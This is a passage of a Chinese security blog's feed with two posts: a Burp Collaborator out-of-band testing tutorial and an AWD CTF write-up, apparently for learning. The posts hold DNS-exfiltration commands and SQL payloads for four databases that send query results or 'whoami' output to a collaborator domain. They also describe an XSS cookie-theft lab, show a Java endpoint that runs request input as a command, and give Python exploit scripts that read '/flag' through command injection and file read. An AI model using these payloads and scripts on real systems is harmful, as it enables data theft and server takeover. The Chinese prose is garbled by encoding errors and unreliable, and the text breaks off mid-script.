    <id>https://lhhxs.github.io/2022/09/09/WEB/Burp%20Collaborator-%E5%B8%A6%E5%A4%96%E6%8A%80%E6%9C%AF%E5%B7%A5%E5%85%B7/</id>
    <published>2022-09-09T15:39:20.043Z</published>
    <updated>2022-09-09T15:39:20.147Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Burp-Collaborator"><a href="#Burp-Collaborator" class="headerlink" title="Burp Collaborator"></a><strong>Burp Collaborator</strong></h2><h2 id="ä»€ä¹ˆæ˜¯Burp-Collaboratorï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯Burp-Collaboratorï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯Burp Collaboratorï¼Ÿ"></a><strong>ä»€ä¹ˆæ˜¯Burp Collaboratorï¼Ÿ</strong></h2><p>Burp Collaborator æ˜¯ OASTçš„äº§ç‰©ï¼Œå®ƒå¯ä»¥å¸®ä½ å®ç°å¯¹å“åº”ä¸å¯è§å’Œå¼‚æ­¥çš„ä¸€ä¸ªæ¼æ´æ£€æµ‹ã€‚</p><p>ç›®å‰ Burp å‘å¸ƒçš„æ–°ç‰ˆæœ¬ä¸­é»˜è®¤æºå¸¦äº† Burp Collaborator æ¨¡å—</p><h2 id="Burp-Collaborator-åŸç†"><a href="#Burp-Collaborator-åŸç†" class="headerlink" title="Burp Collaborator åŸç†"></a><strong>Burp Collaborator åŸç†</strong></h2><p>Burp Collaborator æ¨¡å‹ å‚è€ƒä¸Šæ–‡å¸¦å¤–æ”»å‡»æ¨¡å‹</p><p>Burp Collaborator æœ‰è‡ªå·±ä¸“ç”¨åŸŸå **<a href="https://link.zhihu.com/?target=http://burpcollaborator.net">http://burpcollaborator.net</a>**ï¼Œç±»ä¼¼äºceyeå¹³å°ï¼Œæœ‰ä¸€ä¸ªæƒå¨DNSæœåŠ¡å™¨ï¼Œç”¨æˆ·ä½¿ç”¨Collaboratoræ¨¡å—æ—¶ä¼šç»™æ¯ä¸€ä¸ªç”¨æˆ·ä¼šåˆ†é…ä¸€ä¸ªäºŒçº§åŸŸåã€‚</p><h2 id="Burp-Collaborator-é…ç½®"><a href="#Burp-Collaborator-é…ç½®" class="headerlink" title="Burp Collaborator é…ç½®"></a><strong>Burp Collaborator é…ç½®</strong></h2><p>Burp Collaborator åªæ˜¯ä¸€ä¸ªå®¢æˆ·ç«¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Burp ç»™æˆ‘ä»¬é…ç½®çš„é»˜è®¤å¸¦å¤–æœåŠ¡å™¨ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨è‡ªå·±ç§æœ‰çš„æœåŠ¡å™¨ã€‚</p><p><strong>Burp Collaborator é…ç½®</strong></p><p>å¯ä»¥é€‰æ‹©ä½¿ç”¨é»˜è®¤çš„é…ç½® å¤–å¸¦æœåŠ¡å™¨ï¼Œä¹Ÿå¯ä»¥è‡ªå·±è®¾ç½®å¤–å¸¦æœåŠ¡å™¨</p><p><img src="https://pic4.zhimg.com/v2-5999e05faaf9028561f2d1ea1773e5f3_b.jpg"></p><p>ç‚¹å‡» <code>Run health check</code> å¯ä»¥æµ‹è¯•å¤–å¸¦æœåŠ¡å™¨æœåŠ¡æ˜¯å¦æ­£å¸¸</p><p><img src="https://pic3.zhimg.com/v2-12b1a03e21fac915aa20f5b025a7d966_b.jpg"></p><h2 id="Burp-Collaborator-ä½¿ç”¨"><a href="#Burp-Collaborator-ä½¿ç”¨" class="headerlink" title="Burp Collaborator ä½¿ç”¨"></a><strong>Burp Collaborator ä½¿ç”¨</strong></h2><p>æ‰“å¼€ Collaborator å®¢æˆ·ç«¯</p><p><img src="https://pic1.zhimg.com/v2-c3ddf7013ca58f92e05bd8d45011d870_b.jpg"></p><p>ä½¿ç”¨ Client</p><p><img src="https://pic4.zhimg.com/v2-632b6aabb662a3cf2d81162a0e474bdf_b.jpg"></p><p>ä½¿ç”¨ <strong>dig</strong> æŸ¥è¯¢ åŸŸå</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig `whoami`.7jr9gk6gtnstix33jp6181eu2l8cw1.burpcollaborator.net</span><br></pre></td></tr></table></figure><p><img src="https://pic1.zhimg.com/v2-bcb11aa2c75facc5db801a182f04a0b8_b.jpg"></p><p>æŸ¥çœ‹<code>Client</code>è¿”å›çš„æ—¥å¿—</p><p>å¯è§ï¼Œæˆ‘ä»¬é€šè¿‡dig æŸ¥çœ‹DNSè®°å½•çš„æ–¹å¼ï¼Œå°†whoamiçš„å‘½ä»¤æºå¸¦å‘é€åˆ°æœåŠ¡å™¨ã€‚</p><p><img src="https://pic2.zhimg.com/v2-1d68eb6b08d8f092eb0ad91e468c18d9_b.jpg"></p><h2 id="Burp-Collaborator-åº”ç”¨"><a href="#Burp-Collaborator-åº”ç”¨" class="headerlink" title="Burp Collaborator åº”ç”¨"></a><strong>Burp Collaborator åº”ç”¨</strong></h2><p>ä½¿ç”¨Burp æä¾›çš„é¶åœºï¼Œæ¥ä»‹ç» Burp Collaboratorçš„ç”¨æ³•</p><p><strong>å·¥ä½œåŸç†</strong></p><p>Burp Collaborator ç”Ÿæˆå”¯ä¸€çš„åŸŸåï¼Œå°†å®ƒä»¬ä»¥æœ‰æ•ˆè´Ÿè½½çš„å½¢å¼å‘é€åˆ°åº”ç”¨ç¨‹åºï¼Œå¹¶ç›‘è§†ä¸è¿™äº›åŸŸçš„ä»»ä½•äº¤äº’ã€‚å¦‚æœè§‚å¯Ÿåˆ°æ¥è‡ªåº”ç”¨ç¨‹åºçš„ä¼ å…¥è¯·æ±‚ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ£€æµ‹åˆ°å¯¹åº”çš„æ¼æ´ã€‚</p><h3 id="æ£€æµ‹å¤–éƒ¨æœåŠ¡äº¤äº’ï¼ˆSSRFï¼‰"><a href="#æ£€æµ‹å¤–éƒ¨æœåŠ¡äº¤äº’ï¼ˆSSRFï¼‰" class="headerlink" title="æ£€æµ‹å¤–éƒ¨æœåŠ¡äº¤äº’ï¼ˆSSRFï¼‰"></a><strong>æ£€æµ‹å¤–éƒ¨æœåŠ¡äº¤äº’ï¼ˆSSRFï¼‰</strong></h3><blockquote><p>SSRF : æœåŠ¡å™¨åœ¨åŠ è½½å¤–éƒ¨URLæ—¶ï¼Œæ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ï¼Œå¯¼è‡´ç”¨æˆ·å¯ä»¥è¯·æ±‚æˆ–è€…ç»•è¿‡è¿‡æ»¤è¯·æ±‚å…¶ä»–åŸŸèµ„æºæˆ–è€…å¯¹æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘è¿›è¡Œæœªæˆæƒè®¿é—®ã€‚</p></blockquote><p><strong>æ£€æµ‹è¿‡ç¨‹</strong></p><ol><li>åº”ç”¨ç¨‹åºé€šè¿‡è·å–URLçš„å†…å®¹çš„æ“ä½œï¼Œæ‹¿åˆ°æˆ‘ä»¬æä¾›çš„æœ‰æ•ˆè½½è·ï¼Œå¹¶ä»¥ä¸å®‰å…¨çš„æ–¹å¼æ‰§è¡Œï¼Œ</li><li>æ ¹æ®æˆ‘ä»¬çš„æœ‰æ•ˆè½½è·ï¼Œ<code>å®ƒå°†é¦–å…ˆå¯¹éšæœºå­åŸŸæ‰§è¡Œ DNS æŸ¥æ‰¾ï¼Œç„¶åæ‰§è¡Œ HTTP è¯·æ±‚ã€‚</code></li><li>Collaborator æœåŠ¡å™¨æ¥ DNS æŸ¥æ‰¾å’Œ HTTP è¯·æ±‚ï¼Œä¸¤ç§äº¤äº’éƒ½åŒ…å« Brup æ”¾å…¥ Collaborator çš„éšæœºæ•°æ®ã€‚</li><li>Burp è½®è¯¢ Collaborator æœåŠ¡å™¨å¹¶è¯¢é—® â€œä½ æ”¶åˆ°æˆ‘çš„æœ‰æ•ˆè´Ÿè½½çš„ä»»ä½•äº¤äº’äº†å—ï¼Ÿâ€ï¼Œç„¶å Collaborator è¿”å›äº¤äº’è¯¦ç»†ä¿¡æ¯ã€‚</li><li>Burp åœ¨å°†äº¤äº’ä¿¡æ¯è¿”å›åˆ° Client ã€‚</li></ol><p><img src="https://pic4.zhimg.com/v2-0222c14dfef69e3c32bc958ebb023c7b_b.jpg"></p><h2 id="Burpé¶åœº-ç›²SSRF"><a href="#Burpé¶åœº-ç›²SSRF" class="headerlink" title="Burpé¶åœº -ç›²SSRF"></a><strong>Burpé¶åœº -ç›²SSRF</strong></h2><p><img src="https://pic2.zhimg.com/v2-45b71adf94da6055b8957f49ad85d679_b.jpg"></p><p>å°†Burp Collaborator Client çš„è·å–çš„åŸŸå æ·»åŠ HTTPè¯·æ±‚çš„ Refererä½ç½® ç­‰å¾…å‡ ç§’ ç„¶åç‚¹å‡»poll now ä¼šçœ‹åˆ°åº”ç”¨ç¨‹åºå¯åŠ¨çš„DNS å’ŒHTTPäº¤äº’</p><h2 id="SQLié¶åœº-DNSLog-SQLæ³¨å…¥"><a href="#SQLié¶åœº-DNSLog-SQLæ³¨å…¥" class="headerlink" title="SQLié¶åœº - DNSLog-SQLæ³¨å…¥"></a><strong>SQLié¶åœº - DNSLog-SQLæ³¨å…¥</strong></h2><blockquote><p>SQLæ³¨å…¥ï¼šç”¨æˆ·è¾“å…¥çš„å‚æ•°æ‹¼æ¥åˆ°SQLè¯­å¥ä¸­è¢«æ‰§è¡Œï¼Œå½“è¾“å…¥çš„å‚æ•°å¯æ§æ—¶ï¼Œå¯ä»¥é€šè¿‡å‚æ•°è·å–å…¶ä»–ç”¨æˆ·çš„æ•°æ®ã€‚<br>å¸¸è§æ•°æ®åº“å¤–å¸¦è¯­æ³•<br>MSSQLï¼š<code>declare @p varchar(1024);set @p=(select æŸ¥è¯¢è¯­å¥);exec(&#39;master..xp_dirtree &quot;//&#39;+@p+&#39;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a&quot;&#39;)</code><br>Oracleï¼š<code>SELECT extractvalue(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://&#39;||(SELECT YOUR-QUERY-HERE)||&#39;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) FROM dual</code><br>MySQLï¼š<code>select LOAD_FILE(&#39;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a&#39;)</code><br>PostgreSQL:<code>create OR replace function f() returns void as $$ declare c text; declare p text; begin SELECT into p (SELECT YOUR-QUERY-HERE); c := &#39;copy (SELECT &#39;&#39;&#39;&#39;) to program &#39;&#39;nslookup &#39;||p||&#39;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net&#39;&#39;&#39;; execute c; END; $$ language plpgsql security definer; SELECT f();</code></p></blockquote><p>æˆ‘è¿™é‡Œä½¿ç”¨ sqli çš„é¶åœºæ¼”ç¤ºä¸€ä¸‹åˆ©ç”¨ burp Collaborator å®ç°DNSLogæ³¨å…¥</p><p>å‰ææ¡ä»¶ï¼š<code>secure_file_priv</code> ä¸ºç©ºï¼Œï¼ˆå¦‚æœéç©ºï¼Œåªèƒ½è¯»å–å¯¹åº”ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼‰</p><p><code>select 1,2,LOAD_FILE(concat(&#39;\\\\&#39;,database(),&#39;~&#39;,&#39;xwxb0b0bnpm5bnjbo19apeivpmvfj4.burpcollaborator.net\\a&#39;)) --+</code></p><p><img src="https://pic2.zhimg.com/v2-204e15458a3ed5ede89d8d5352af1c35_b.jpg"></p><h2 id="Burpé¶åœº-XSS-ç›²æ‰“cookie"><a href="#Burpé¶åœº-XSS-ç›²æ‰“cookie" class="headerlink" title="Burpé¶åœº - XSS ç›²æ‰“cookie"></a><strong>Burpé¶åœº - XSS ç›²æ‰“cookie</strong></h2><blockquote><p>è·¨ç«™ç‚¹è„šæœ¬ï¼ˆä¹Ÿç§°ä¸º XSSï¼‰æ˜¯ä¸€ç§ Web å®‰å…¨æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…ç ´åç”¨æˆ·ä¸æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºçš„äº¤äº’ã€‚å®ƒå…è®¸æ”»å‡»è€…ç»•è¿‡åŒæºç­–ç•¥ï¼Œè¯¥ç­–ç•¥æ—¨åœ¨å°†ä¸åŒçš„ç½‘ç«™ç›¸äº’éš”ç¦»ã€‚è·¨ç«™ç‚¹è„šæœ¬æ¼æ´é€šå¸¸å…è®¸æ”»å‡»è€…ä¼ªè£…æˆå—å®³è€…ç”¨æˆ·ï¼Œæ‰§è¡Œç”¨æˆ·èƒ½å¤Ÿæ‰§è¡Œçš„ä»»ä½•æ“ä½œï¼Œå¹¶è®¿é—®ç”¨æˆ·çš„ä»»ä½•æ•°æ®ã€‚å¦‚æœå—å®³è€…ç”¨æˆ·åœ¨åº”ç”¨ç¨‹åºä¸­å…·æœ‰ç‰¹æƒè®¿é—®æƒé™ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿå®Œå…¨æ§åˆ¶åº”ç”¨ç¨‹åºçš„æ‰€æœ‰åŠŸèƒ½å’Œæ•°æ®ã€‚</p></blockquote><p>åœ¨ xss payload ä¸­ï¼Œæ·»åŠ è‡ªå·±burp collaborator ç”Ÿæˆçš„åŸŸå</p><p><img src="https://pic2.zhimg.com/v2-6cdb77e786472b0d510ec25db86de945_b.jpg"></p><p>ç­‰å¾… ç®¡ç†å‘˜æŸ¥çœ‹è¯„è®ºå³å¯è§¦å‘ xss payload å®ç°å¯¹cookie çš„è·å–</p><p><img src="https://pic2.zhimg.com/v2-762cf51e5ff642e54da29fda1b4e0459_b.jpg"></p><h2 id="Burpé¶åœº-å¸¦å¤–å‘½ä»¤æ³¨å…¥"><a href="#Burpé¶åœº-å¸¦å¤–å‘½ä»¤æ³¨å…¥" class="headerlink" title="Burpé¶åœº - å¸¦å¤–å‘½ä»¤æ³¨å…¥"></a><strong>Burpé¶åœº - å¸¦å¤–å‘½ä»¤æ³¨å…¥</strong></h2><blockquote><p>æ“ä½œç³»ç»Ÿå‘½ä»¤æ³¨å…¥ï¼ˆä¹Ÿç§°ä¸º shell æ³¨å…¥ï¼‰æ˜¯ä¸€ç§ Web å®‰å…¨æ¼æ´ï¼Œå®ƒå…è®¸æ”»å‡»è€…åœ¨è¿è¡Œåº”ç”¨ç¨‹åºçš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„æ“ä½œç³»ç»Ÿ (OS) å‘½ä»¤ï¼Œå¹¶ä¸”é€šå¸¸ä¼šå®Œå…¨ç ´ååº”ç”¨ç¨‹åºåŠå…¶æ‰€æœ‰æ•°æ®ã€‚å¾ˆå¤šæ—¶å€™ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ“ä½œç³»ç»Ÿå‘½ä»¤æ³¨å…¥æ¼æ´æ¥ç ´åæ‰˜ç®¡åŸºç¡€è®¾æ–½çš„å…¶ä»–éƒ¨åˆ†ï¼Œåˆ©ç”¨ä¿¡ä»»å…³ç³»å°†æ”»å‡»è½¬å‘ç»„ç»‡å†…çš„å…¶ä»–ç³»ç»Ÿã€‚</p></blockquote><p><img src="https://pic4.zhimg.com/v2-12e88a68074d7b9180c0c88c1f1d18ff_b.jpg"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a><strong>æ€»ç»“</strong></h2><p>è¿˜æœ‰æ›´å¤šç”¨æ³•ï¼ŒæœŸå¾…å¤§å®¶å»å‘ç°ï¼Œ</p><p>ä¸€ä¸ªå°tipsï¼šå¤šå»çœ‹çœ‹å®˜æ–¹æ–‡æ¡£ï¼Œä¼šå‘ç°æ›´å¤šç¥å¥‡çš„ç”¨æ³•ã€‚</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Burp-Collaborator&quot;&gt;&lt;a href=&quot;#Burp-Collaborator&quot; class=&quot;headerlink&quot; title=&quot;Burp Collaborator&quot;&gt;&lt;/a&gt;&lt;strong&gt;Burp Collaborator&lt;/strong&gt;&lt;</summary>
      
    
    
    
    <category term="WEB" scheme="https://lhhxs.github.io/categories/WEB/"/>
    
    
    <category term="CTF" scheme="https://lhhxs.github.io/tags/CTF/"/>
    
    <category term="burpsuite" scheme="https://lhhxs.github.io/tags/burpsuite/"/>
    
    <category term="javaååºåˆ—åŒ–" scheme="https://lhhxs.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>è®°8æœˆæŸæ¬¡AWD</title>
    <link href="https://lhhxs.github.io/2022/09/09/writeup/%E8%AE%B08%E6%9C%88%E6%9F%90%E6%AC%A1AWD/"/>
    <id>https://lhhxs.github.io/2022/09/09/writeup/%E8%AE%B08%E6%9C%88%E6%9F%90%E6%AC%A1AWD/</id>
    <published>2022-09-09T14:43:26.552Z</published>
    <updated>2022-09-09T15:30:48.114Z</updated>
    
    <content type="html"><![CDATA[<p>æ‰“äº†ä¸€æ¬¡å†…éƒ¨èµ›AWDï¼Œç¬¬ä¸€æ¬¡åšjavaï¼Œæ”¶è·é¢‡ä¸°ï¼Œç‰¹æ­¤è®°å½•ã€‚</p><h1 id="æ”»é˜²"><a href="#æ”»é˜²" class="headerlink" title="æ”»é˜²"></a>æ”»é˜²</h1><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/apiTest&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">apiTest</span><span class="params">(String param)</span> &#123;</span><br><span class="line">       <span class="type">Runtime</span> <span class="variable">run</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">       <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> run.exec(param);</span><br><span class="line">           <span class="type">BufferedInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(p.getInputStream());</span><br><span class="line">           <span class="type">BufferedReader</span> <span class="variable">inBr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">           String tmpStr;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">while</span> ((tmpStr = inBr.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">               sb.append(tmpStr);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (p.waitFor() != <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="keyword">if</span> (p.exitValue() == <span class="number">1</span>)</span><br><span class="line">                   <span class="keyword">return</span> <span class="string">&quot;Something wrong!&quot;</span>;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           inBr.close();</span><br><span class="line">           in.close();</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           logger.error(e.toString());</span><br><span class="line">           <span class="keyword">return</span> e.toString();</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> sb.toString();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>&#x2F;util&#x2F;apiTestæ¥å£ å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /util/apiTest?param=cat%20/flag</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit_flag</span>(<span class="params">flag</span>):</span><br><span class="line">    url = <span class="string">f&#x27;http://xxxxx/api/flag&#x27;</span></span><br><span class="line">    proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;https&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;flag&quot;</span>: flag</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=url, headers=&#123;<span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;xxx&quot;</span>&#125;, proxies=proxies)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">url</span>):</span><br><span class="line">    url = url + <span class="string">&#x27;util/apiTest?param=cat%20%2fflag&#x27;</span></span><br><span class="line">    headers = &#123;&#125;</span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;https&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">        response = requests.get(url=url, headers=headers, data=data, proxies=proxies)</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == requests.codes.ok:</span><br><span class="line">            <span class="keyword">if</span> re.search(<span class="string">r&#x27;flag&#123;.*&#125;&#x27;</span>, response.text):</span><br><span class="line">                flag = re.search(<span class="string">r&#x27;flag&#123;.*&#125;&#x27;</span>, response.text)[<span class="number">0</span>]</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] &quot;</span> + url + <span class="string">&quot; connect shell success, flag is &quot;</span> + flag)</span><br><span class="line">                submit_flag(flag)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] Cannot get flag&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Shell 404&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] &quot;</span> + url + <span class="string">&quot; connect shell failed&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    get_flag(<span class="string">&#x27;http://127.0.0.1:10180/&#x27;</span>)</span><br><span class="line">    <span class="comment"># count = 1</span></span><br><span class="line">    <span class="comment"># while 1:</span></span><br><span class="line">        <span class="comment"># print(f&quot;==========ç¬¬&#123;count&#125;è½®æäº¤=========&quot;)</span></span><br><span class="line">        <span class="comment"># count = 10180</span></span><br><span class="line">        <span class="comment"># for i in range(1, 81):</span></span><br><span class="line">            <span class="comment"># url ä¸ºé¶æœºip</span></span><br><span class="line">            <span class="comment"># uri = f&#x27;http://192.168.70.12:&#123;count&#125;/&#x27;</span></span><br><span class="line">            <span class="comment"># print(f&quot;==========ç¬¬&#123;i&#125;å·é¶æœº===========&quot;)</span></span><br><span class="line">            <span class="comment"># get_flag1(uri)</span></span><br><span class="line">            <span class="comment"># count += 100</span></span><br><span class="line">        <span class="comment"># time.sleep(300) </span></span><br></pre></td></tr></table></figure><h3 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&#123;&quot;/apiTest&quot;&#125;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">apiTest</span><span class="params">(String param)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><h3 id="æºç -1"><a href="#æºç -1" class="headerlink" title="æºç "></a>æºç </h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/image&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">getImage</span><span class="params">(String filepath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">       <span class="keyword">return</span> getImgBase64(filepath);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´åˆ©ç”¨-1"><a href="#æ¼æ´åˆ©ç”¨-1" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>&#x2F;util&#x2F;image?filepath&#x3D;xxx ä»»æ„æ–‡ä»¶è¯»å–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /util/image?filepath=/flag</span><br></pre></td></tr></table></figure><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit_flag</span>(<span class="params">flag</span>):</span><br><span class="line">    url = <span class="string">f&#x27;http://xxxxx/api/flag&#x27;</span></span><br><span class="line">    proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;https&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;flag&quot;</span>: flag</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=url, headers=&#123;<span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;xxxx&quot;</span>&#125;, proxies=proxies,</span><br><span class="line">                        data=data)</span><br><span class="line">    <span 